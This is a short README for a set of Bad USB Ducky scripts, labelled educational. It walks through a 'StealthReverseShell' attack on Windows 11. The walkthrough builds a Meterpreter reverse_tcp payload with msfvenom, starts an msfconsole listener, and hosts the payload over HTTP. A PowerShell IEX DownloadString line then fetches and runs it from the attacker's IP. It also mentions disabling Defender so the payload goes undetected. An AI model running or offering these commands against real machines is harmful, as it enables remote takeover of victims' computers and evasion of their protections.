# **Various Ducky scripts for Bad USBs**
#### **Can be used for pentesting or administrative tasks.** 
#### **For educational puposes only!**
#### **Requires Admin privileges to disable Defender. Otherwise, the payload may be detected.**
#### **Tested and working on WIndows 11**
<br>
### **Steps to Compromise(StealthReverseShell):**
1. Create the payload with msfvenom<br/> 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=AttacksersIP LPORT=AttackersPort -f psh -o PAYLOAD.ps1<br/>
2. Open msfconsole and start listener<br/>
msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost IP; set lport PORT; set ExitOnSession false; exploit -j"<br/>
3. Start python http server<br/>
python3 -m http.server 80<br/>
4. Ducky script will download and execute payload session<br/>
IEX(New-Object System.Net.WebClient).DownloadString('http://IPADDR/PAYLOAD.ps1')

## Demonstration Video 
Insert video in markdown

